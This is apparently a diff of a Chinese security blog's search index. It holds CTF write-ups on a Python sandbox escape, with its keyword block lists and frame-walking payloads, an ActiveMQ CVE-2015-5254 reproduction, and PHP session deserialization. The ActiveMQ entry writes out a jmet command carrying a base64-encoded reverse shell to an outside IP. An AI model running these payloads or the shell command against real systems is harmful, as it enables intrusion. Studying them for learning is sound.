class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>runner.py:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
-
-<p>py栈帧逃逸</p>
-<p><a class="link"   href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dG==uh8kAhiD&alichlgref=https://www.cnblogs.com/" >Python利用栈帧沙箱逃逸 - 先知社区 (aliyun.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>这题的flag在沙箱的上上上帧（自己构造的两个函数两帧，exec里的一帧）</p>
-<p>获取上上帧对象的三种方式</p>
-<ol>
-<li></li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = <span class="built_in">next</span>(g)</span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>
-
-<p>第一个方法不行，使用next获取栈帧对象会让结果包含LOAD_GLOBAL</p>
-<ol start="2">
-<li></li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back.f_back.f_back.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]<span class="comment">#用这&lt;listcomp&gt;需要多逃一帧</span></span><br><span class="line">    <span class="keyword">return</span> frame</span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li></li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"> <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line"> pop = exp()</span><br><span class="line"> <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line"> boo=exp</span><br><span class="line"> <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br></pre></td></tr></table></figure>
-
-<p>最后还作了个检测，就是flag不能存在output中</p>
-<p>这里也有两种绕法</p>
-<p>payload1:<code>print(kino.f_code.co_consts[16][1:])</code></p>
-<p>截取字符串绕过，我这里用的ctfshow复现的环境，前面这个下标是16</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240524180044325.png"  alt="image-20240524180044325"></p>
-<p>payload2:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">payload = &#x27;&#x27;&#x27;def getflag():</span><br><span class="line">    def f():</span><br><span class="line">        yield g.gi_frame.f_back</span><br><span class="line">    g = f()</span><br><span class="line">    frame=[x for x in g][0]</span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_locals[&#x27;_&#x27;+&#x27;_builtins_&#x27;+&#x27;_&#x27;]  </span><br><span class="line">    code = frame.f_back.f_back.f_back.f_code </span><br><span class="line">    gattr_dir = gattr.dir</span><br><span class="line">    s  = gattr.str</span><br><span class="line">    print(gattr_dir(code))</span><br><span class="line">    for i in s(code.co_consts):</span><br><span class="line">        print(i,end=&quot;,&quot;)</span><br><span class="line">getflag()&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;code&quot;: payload</span><br><span class="line">&#125;</span><br><span class="line">print(json.dumps(data))</span><br></pre></td></tr></table></figure>
-
-<p>先用builtins获取str，然后把code.co_consts变为字符串后输出，每隔一个字符用，隔开即可</p>
-<h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240527172754306.png"  alt="image-20240527172754306"></p>
-<p>你知道的，jdbc的攻击基本是围绕着驱动来攻击的</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240527172840785.png"  alt="image-20240527172840785"></p>
-<p>提供四个驱动，一个一个寻找漏洞条件</p>
-<p>第一个Mysql，我知道的就反序列化漏洞，看看版本</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173431572.png"  alt="image-20240527173431572"></p>
-<p>no</p>
-<p>第二个PostgreSQL，控制bean.xml进行rce</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240527173557400.png"  alt="image-20240527173557400"></p>
-<p>no</p>
-<p>第三个是sqlite服务</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240527203847332.png"  alt="image-20240527203847332"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/1f913.png"  alt="🤓书呆子脸:高清大图与Unicode信息 | EmojiAll"></p>
-<p>对啦！</p>
-<p>[项目文件预览 - GitCode](<a class="link"   href="https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC" >https://gitcode.com/Y4tacker/JavaSec/blob/main/9.JDBC<i class="fas fa-external-link-alt"></i></a> Attack&#x2F;PostGreSQL&#x2F;index.md?utm_source&#x3D;csdn_github_accelerator&amp;isLogin&#x3D;1)</p>
-<p><a class="link"   href="https://gitcode.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java" >项目文件预览 - JDBC-Attack - GitCode<i class="fas fa-external-link-alt"></i></a></p>
-<p>复现太麻烦了，包括环境下载，然后还有远程debug，这些都好难弄，只按wp做了一次</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>奶奶滴临近期末，写个复现都要写几周，还有一题sanic没看，我嘞个忙</p>
-<p>赛后复现赛题发现我的复现能力太差了，环境不会装，docker不会用，debug不会debug，累了</p>
-<p>接下来就学学复现环境吧，从vulhub开始，然后一点一点学着调试，分析，这应该应该还算个美妙的过程</p>
-<p>我在复现thinkphp的时候调试的时候就调试得我挺美的</p>
-<p>期考，会赢吗？</p>
-<p><img   src="/../img/$%7Bfiilename%7D/OIP-C.mG6e-yzRUBIZy6otnpkH1wAAAAw=169&h=197&c=7&r=0&o=5&dpr=1.7&pid=1.jpeg"  alt="会赢的五条悟 的图像结果"></p>
-<p>还有海大你无敌了，暑假才放一个月半</p>
-]]></content>
-      <categories>
-        <category>Write up</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HDCTF Junior 2024 Winter WP</title>
     <url>/2024/02/22/HDCTF-Junior-2024-Winter-WP/</url>
     <content><![CDATA[<h1 id="新生选拔赛"><a href="#新生选拔赛" class="headerlink" title="新生选拔赛"></a>新生选拔赛</h1><span id="more"></span>
@@ -294,67 +217,6 @@
       </categories>
       <tags>
         <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ActiveMQ反序列化漏洞(CVE-2015-5254)</title>
-    <url>/2024/05/30/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2015-5254/</url>
-    <content><![CDATA[<h1 id="器动"><a href="#器动" class="headerlink" title="器动"></a>器动</h1><span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算是漏洞复现第一章了吧</p>
-<p>目标:</p>
-<p>· 看这些大漏洞在实际的应用</p>
-<p>· 品味吸收发现漏洞和挖掘漏洞的过程</p>
-<p>· 修复漏洞</p>
-<p>· 思维发散，思考有没有其他地方会有同样的漏洞</p>
-<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache ActiveMQ 5.x ~ Apache ActiveMQ 5.13.0</p>
-<h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。本质上还是对JMS的攻击，ActiveMQ不过是一个触发反序列化的跳板。</p>
-<p>有关JMS Attack的文章：</p>
-<p><a class="link"   href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" >us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf (blackhat.com)<i class="fas fa-external-link-alt"></i></a></p>
-<p>上一篇的翻译</p>
-<p><a class="link"   href="https://www.anquanke.com/post/id/84954" >【技术分享】使用反序列化漏洞干掉你的JMS-安全客 - 安全资讯平台 (anquanke.com)<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>在发送object消息时的代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//send</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendObjectMessage</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    jmsTemplate.send(<span class="keyword">new</span> <span class="title class_">MessageCreator</span>() &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> Message <span class="title function_">createMessage</span><span class="params">(Session session)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Staff</span>(<span class="number">1</span>, <span class="string">&quot;搬砖工&quot;</span>); <span class="comment">// Staff必须实现序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectMessage</span> <span class="variable">message</span> <span class="operator">=</span> session.createObjectMessage(staff);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//receive</span></span><br><span class="line"> <span class="comment">// 如果是Object消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message <span class="keyword">instanceof</span> ObjectMessage) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="type">ObjectMessage</span> <span class="variable">om</span> <span class="operator">=</span> (ObjectMessage) message;</span><br><span class="line"></span><br><span class="line">      <span class="type">Staff</span> <span class="variable">staff</span> <span class="operator">=</span> (Staff) om.getObject();</span><br><span class="line"></span><br><span class="line">      System.out.println(<span class="string">&quot;ConsumerService从队列&quot;</span> + destination.toString() + <span class="string">&quot;收到了消息：\t&quot;</span> + staff);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>又到了我们最喜欢的getObject()环节</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530143111195.png"  alt="image-20240530143111195"></p>
-<p>由于ActiveMQ的调试的debug有点复杂，也没来得及看源码</p>
-<p>不过如果你作为挖掘者，在知道以上信息的情况下，一定会源码都不用看，就应该合理猜测在ActiveMQ管理界面中接受消息，就等于执行了以上的receive代码吧，其实真的也不是我懒啦，这确实不用看，直接去试一波就好</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>先用nmap扫扫</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151309225.png"  alt="image-20240530151309225"></p>
-<p>发现了61616端口扫出是apachemq的发出端口，不知道为什么管理的端口没扫出来（pass，就当扫出来了）</p>
-<p><img   src="/../img/$%7Bfiilename%7D/ok-1717053248889-1.jpg"  alt="ok"></p>
-<p>wow，我们成功发现了后台界面(＾－＾)V</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151454795.png"  alt="image-20240530151454795"></p>
-<p>什么，居然用admin和admin就登陆进去了（）</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530151523882.png"  alt="image-20240530151523882"></p>
-<p>居然正是漏洞版本，太巧了吧（</p>
-<p>然后我们像接受端口发送信息，然后在在这个界面接受，不就触发了一个反序列化吗</p>
-<p>这里需要用到一个工具jmet（查了一下好像就是类似个攻击脚本吧，真好，永远有配套服务）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载jmet的jar包</span><br><span class="line">wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</span><br><span class="line">#创建external目录，报错让创建的。。。。。。</span><br><span class="line">mkdir external</span><br></pre></td></tr></table></figure>
-
-<p>之后</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;cp README.txt README1.txt&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170736613.png"  alt="image-20240530170736613"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530170748146.png"  alt="image-20240530170748146"></p>
-<p>这样就算成功啦，之后反弹shell即可，需要编码绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMTc3LjI0MS8yMzMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 172.19.0.2 61616</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240530171632750.png"  alt="image-20240530171632750"></p>
-<p>getshell  !!!!!</p>
-<h1 id="修复漏洞"><a href="#修复漏洞" class="headerlink" title="修复漏洞"></a>修复漏洞</h1><p>1.拒绝反序列化危险的类</p>
-<p>2.解决前台弱口令问题</p>
-<p>3.隐藏接受信息的端口</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-        <tag>ActActiveMQ</tag>
       </tags>
   </entry>
   <entry>
@@ -847,6 +709,70 @@
       </tags>
   </entry>
   <entry>
+    <title>php_Session反序列化学习</title>
+    <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="php反序列化的一种"><a href="#php反序列化的一种" class="headerlink" title="php反序列化的一种"></a>php反序列化的一种</h1><span id="more"></span>
+
+<h1 id="从开发者角度认识session"><a href="#从开发者角度认识session" class="headerlink" title="从开发者角度认识session"></a>从开发者角度认识session</h1><h2 id="为什么需要session"><a href="#为什么需要session" class="headerlink" title="为什么需要session"></a>为什么需要session</h2><p>由于http协议是无状态的，所以我们需要一种基于http的技术让服务器识别用户的状态，以达到防护，提供用户个性化资源，记录用户操作等目的</p>
+<h1 id="session一些特性"><a href="#session一些特性" class="headerlink" title="session一些特性"></a>session一些特性</h1><p>相比于cookie，session主要由sessionid和它所带的值组成，而session存储在客户端和服务端两端，客户端只存储sessionid，服务端两个都存。</p>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>如果我想通过session实现一个功能——当用户登录时，页面会显示”你好!xxx”</p>
+<p>简单写个前后端</p>
+<p>注册</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184635095.png"  alt="image-20240225184635095"></p>
+<p>填入后可以看到在tem目录下的session文件</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184701936.png"  alt="image-20240225184701936"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184712646.png"  alt="image-20240225184712646"></p>
+<p>登录</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185914591.png"  alt="image-20240225185914591"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185932722.png"  alt="image-20240225185932722"></p>
+<p>我们就实现了这个功能</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>前面提到用户的输入会以序列化的形式存储在session中，php给我们提供了三种处理引擎，由<code>session.serialize_handler</code>来设置</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152937389.png"  alt="image-20240226152937389"></p>
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>存储格式:键名+竖线+经过<code>serialize()</code>函数序列化处理的值</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152654358.png"  alt="image-20240226152654358"></p>
+<p>这里竖线前面的user是<code>$_SESSION[&#39;user&#39;]</code>里的user，竖线后面的user是类名</p>
+<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><p>键名的长度对应的ASCII字符+键名+经过<code>serialize()</code>函数序列化处理的值</p>
+<p>对比上面的php其实也就多个ASCII字符,少个竖线</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226153657091.png"  alt="image-20240226153657091"></p>
+<p>为了更直观，我把键名写到33个字符，33对应的ASCII字符为!</p>
+<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><p>经过<code>serialize()</code>函数序列化处理的__数组__</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154036903.png"  alt="image-20240226154036903"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154420821.png"  alt="image-20240226154420821"></p>
+<p>a表示的是SESSION数组中有几个元素，花括号里包括序列化后的数据，这里的键名也需要<code>s::;</code>的表达</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当两个文件所用的处理器不相同时，且SESSION数组内的值可控时，我们就可以构造恶意数据来进行操作</p>
+<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我在注册这边使用的是php_binary处理器，登录那边用的是php处理器</p>
+<p>注册这边它的用户名，和密码都是可控的，如果我们正常输入，它会这样存入</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226161914641.png"  alt="image-20240226161914641"></p>
+<p>我们就可以在username的属性动一些手脚达到改属性的目的，这里把Ewoji改为了Emoji</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164258514.png"  alt="image-20240226164258514"></p>
+<p>之后再打开登录文件</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226162151930.png"  alt="image-20240226162151930"></p>
+<p>修改成功</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里是由|产生了歧义，php处理器把|后面的东西当作对象反序列化了</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CTFSHOW-web-263"><a href="#CTFSHOW-web-263" class="headerlink" title="CTFSHOW web-263"></a>CTFSHOW web-263</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240226164651595.png"  alt="image-20240226164651595"></p>
+<p>题面，看源码，抓包无果，直接开扫</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164731869.png"  alt="image-20240226164731869"></p>
+<p><a class="link"   href="http://www.zip,下载,打开/" >www.zip,下载，打开<i class="fas fa-external-link-alt"></i></a></p>
+<p>发现漏洞点</p>
+<p>1.写入SESSION:原本用来记录limit的值可以修改</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185421699.png"  alt="image-20240226185421699"></p>
+<p>2.写入文件:<code>file_put_contents()</code>,这里的意思是用用户输入的username为一个log-xxx的日志文件命名，写入的内容password可以用反序列修改，这就可以直接写马</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185527715.png"  alt="image-20240226185527715"></p>
+<p>3.触发反序列化，这里的&#x2F;inc&#x2F;inc.php是不可访问的，但是check.php没有禁止访问而且它包含了inc.php，访问check.php即可触发反序列化</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185757295.png"  alt="image-20240226185757295"></p>
+<p>最后的payload如下 :</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185841358.png"  alt="image-20240226185841358"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185855523.png"  alt="image-20240226185855523"></p>
+<p>然后连接读取flag即可</p>
+]]></content>
+      <categories>
+        <category>技术探索</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
